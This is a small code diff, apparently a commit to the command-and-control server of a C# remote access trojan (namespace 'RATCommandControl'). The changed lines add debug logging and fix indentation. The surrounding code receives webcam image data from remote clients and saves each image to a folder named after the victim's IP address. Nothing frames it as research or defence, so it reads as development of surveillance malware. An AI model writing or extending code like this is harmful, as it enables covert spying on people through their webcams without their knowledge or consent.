@@ -329,6 +329,7 @@ namespace RATCommandControl
                 }
                 if (recvString.IndexOf("IEND") > -1)
                 {
+                    Console.WriteLine("Broke data loop!");
                     break;
                 }
                 else if (recvString.IndexOf("webcamError") > -1)
@@ -336,7 +337,7 @@ namespace RATCommandControl
                     error = true;
                     break;
                 }
-        }
+            }
             if (!error)
             {
                 var ms = new MemoryStream(imgBytes.ToArray());
@@ -346,6 +347,7 @@ namespace RATCommandControl
                 img.Save(Environment.CurrentDirectory + "\\webcam_" + clientIPEndpoint.Address.MapToIPv4().ToString() + "\\screenshot" + DateTime.Now.Ticks.ToString() + ".png", System.Drawing.Imaging.ImageFormat.Png);
                 img.Dispose();
                 ms.Dispose();
+                Console.WriteLine("Webcam image recieve completed");
             }
             else{
                 Console.WriteLine("An error occurred while processing data from the webcam.");
